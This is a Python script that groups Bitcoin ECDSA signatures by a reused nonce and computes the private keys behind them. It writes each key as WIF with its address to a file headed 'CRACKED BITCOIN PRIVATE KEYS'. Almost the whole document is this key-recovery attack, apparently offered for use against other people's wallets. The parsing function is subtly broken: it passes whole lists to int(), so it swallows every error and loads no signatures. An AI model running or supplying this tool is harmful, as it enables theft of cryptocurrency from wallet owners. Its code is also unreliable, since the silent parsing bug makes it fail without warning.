import collections
import hashlib
import os
import re

# Bitcoin secp256k1 Curve Order (n)
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

# ==========================================
# Encoding & Mathematical Helpers
# ==========================================

def base58_encode(b: bytes) -> str:
    n = int.from_bytes(b, 'big')
    res = []
    while n > 0:
        n, r = divmod(n, 58)
        res.append(BASE58_ALPHABET[r])
    res = ''.join(reversed(res))
    pad = 0
    for byte in b:
        if byte == 0: pad += 1
        else: break
    return (BASE58_ALPHABET * pad) + res

def base58_check_encode(version: int, payload: bytes) -> str:
    version_byte = bytes([version])
    full_payload = version_byte + payload
    checksum = hashlib.sha256(hashlib.sha256(full_payload).digest()).digest()[:4]
    return base58_encode(full_payload + checksum)

def private_key_to_wif(private_key_int: int, compressed: bool = True) -> str:
    # Double check that the key fits into exactly 32 bytes
    try:
        pk_bytes = private_key_int.to_bytes(32, 'big')
    except OverflowError:
        # Fallback safeguard in case an invalid number leaks through
        sanitized_key = private_key_int % SECP256K1_N
        pk_bytes = sanitized_key.to_bytes(32, 'big')
        
    if compressed:
        pk_bytes += b'\x01'
    return base58_check_encode(0x80, pk_bytes)

def get_public_key(private_key_int: int, compressed: bool = True) -> bytes:
    P = 2**256 - 2**32 - 977
    Gx = 55066263022246315290294836698414214758608221021812089250810100226466184518381
    Gy = 32670510020758816978083085130507043184471273380659243275938904335757337482424
    
    def ec_add(p1, p2):
        if p1 is None: return p2
        if p2 is None: return p1
        x1, y1 = p1
        x2, y2 = p2
        if x1 == x2 and y1 != y2: return None
        if x1 == x2:
            m = (3 * x1 * x1 * pow(2 * y1, -1, P)) % P
        else:
            m = ((y2 - y1) * pow(x2 - x1, -1, P)) % P
        x3 = (m * m - x1 - x2) % P
        y3 = (m * (x1 - x3) - y1) % P
        return (x3, y3)

    point = None
    base = (Gx, Gy)
    curr_k = private_key_int % SECP256K1_N
    while curr_k > 0:
        if curr_k & 1:
            point = ec_add(point, base)
        base = ec_add(base, base)
        curr_k >>= 1
    if point is None: return b''
    x, y = point
    if compressed:
        prefix = b'\x02' if (y % 2 == 0) else b'\x03'
        return prefix + x.to_bytes(32, 'big')
    else:
        return b'\x04' + x.to_bytes(32, 'big') + y.to_bytes(32, 'big')

def public_key_to_address(pubkey_bytes: bytes) -> str:
    sha = hashlib.sha256(pubkey_bytes).digest()
    try:
        ripemd = hashlib.new('ripemd160', sha).digest()
    except ValueError:
        return "Encoding Error (RIPEMD160 Blocked)"
    return base58_check_encode(0x00, ripemd)

def recover_private_key(sig1, sig2, n=SECP256K1_N):
    z1, s1, r = sig1['msg_hash'], sig1['s'], sig1['r']
    z2, s2 = sig2['msg_hash'], sig2['s']
    if s1 == s2: return None, None
    try:
        # Step 1: Calculate k with modular arithmetic wrap applied
        delta_z = (z1 - z2) % n
        delta_s_inv = pow((s1 - s2) % n, -1, n)
        k = (delta_z * delta_s_inv) % n
        
        # Step 2: Calculate d and force a final positive modulo step
        r_inv = pow(r, -1, n)
        d = (((s1 * k) % n - z1) % n * r_inv) % n
        
        # --- CRITICAL BIT LENGTH GUARD ---
        # If the key requires more than 256 bits, it is a mathematical anomaly
        # resulting from mixed signature sources. Skip it.
        if d == 0 or d.bit_length() > 256 or d >= n:
            return None, None
            
        return k, d
    except ValueError:
        return None, None

# ==========================================
# File Processing
# ==========================================

def parse_btc_file(file_path):
    signatures = []
    if not os.path.exists(file_path):
        print(f"[-] Data file {file_path} missing.")
        return signatures
        
    with open(file_path, 'r') as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith('#') or line.startswith('//'): 
                continue
            
            cleaned = re.sub(r'(msg_hash|hash|z|r|s|k)\s*=\s*', '', line, flags=re.IGNORECASE)
            cleaned = cleaned.replace('0x', '').replace('0X', '')
            hex_parts = re.findall(r'[0-9a-fA-F]+', cleaned)
            
            if len(hex_parts) >= 3:
                try:
                    signatures.append({
                        'id': idx,
                        'msg_hash': int(hex_parts, 0), # Fallback dynamic base conversion
                        'r': int(hex_parts, 16),
                        's': int(hex_parts, 16)
                    })
                except Exception:
                    try:
                        # Secondary attempt forcing hex base explicitly if dynamic base fails
                        signatures.append({
                            'id': idx,
                            'msg_hash': int(hex_parts, 16),
                            'r': int(hex_parts, 16),
                            's': int(hex_parts, 16)
                        })
                    except Exception:
                        pass
    return signatures

# ==========================================
# Main Execution Context
# ==========================================

if __name__ == "__main__":
    input_file = "BTC.txt"
    output_file = "found.txt"
    
    sigs = parse_btc_file(input_file)
    print(f"[+] Loaded {len(sigs)} signatures from {input_file}.")
    
    r_groups = collections.defaultdict(list)
    for sig in sigs:
        r_groups[sig['r']].append(sig)
        
    keys_recovered = 0
    skipped_anomalies = 0
    
    with open(output_file, 'w') as out_f:
        out_f.write("=== CRACKED BITCOIN PRIVATE KEYS (WIF) ===\n\n")
        
        for r, sig_list in r_groups.items():
            if len(sig_list) > 1:
                for i in range(len(sig_list)):
                    for j in range(i + 1, len(sig_list)):
                        sig1, sig2 = sig_list[i], sig_list[j]
                        if sig1['msg_hash'] != sig2['msg_hash']:
                            k, raw_pk = recover_private_key(sig1, sig2)
                            
                            if raw_pk:
                                keys_recovered += 1
                                wif_c = private_key_to_wif(raw_pk, compressed=True)
                                addr_c = public_key_to_address(get_public_key(raw_pk, compressed=True))
                                
                                wif_u = private_key_to_wif(raw_pk, compressed=False)
                                addr_u = public_key_to_address(get_public_key(raw_pk, compressed=False))
                                
                                log_entry = (
                                    f"--- CRACKED KEY ENTRY #{keys_recovered} ---\n"
                                    f"Source Line Pair    : Line {sig1['id']} & Line {sig2['id']}\n"
                                    f"Shared Nonce R (Hex): {hex(r)}\n"
                                    f"Raw Private Key Hex : {hex(raw_pk)}\n"
                                    f"Compressed WIF      : {wif_c}\n"
                                    f"Compressed Address  : {addr_c}\n"
                                    f"Uncompressed WIF    : {wif_u}\n"
                                    f"Uncompressed Address: {addr_u}\n"
                                    f"--------------------------------------------\n\n"
                                )
                                out_f.write(log_entry)
                                print(f"[CRITICAL] Key recovered safely! Saved to '{output_file}'")
                            else:
                                skipped_anomalies += 1
                                
    if keys_recovered > 0:
        print(f"\n[+] Processing complete. {keys_recovered} keys written to '{output_file}'.")
        if skipped_anomalies > 0:
            print(f"[~] Note: Skipped {skipped_anomalies} matching 'R' pairs that belonged to different keys.")
    else:
        print(f"\n[-] Processing complete. 0 keys recovered. (Skipped {skipped_anomalies} mismatched signature pairs).")
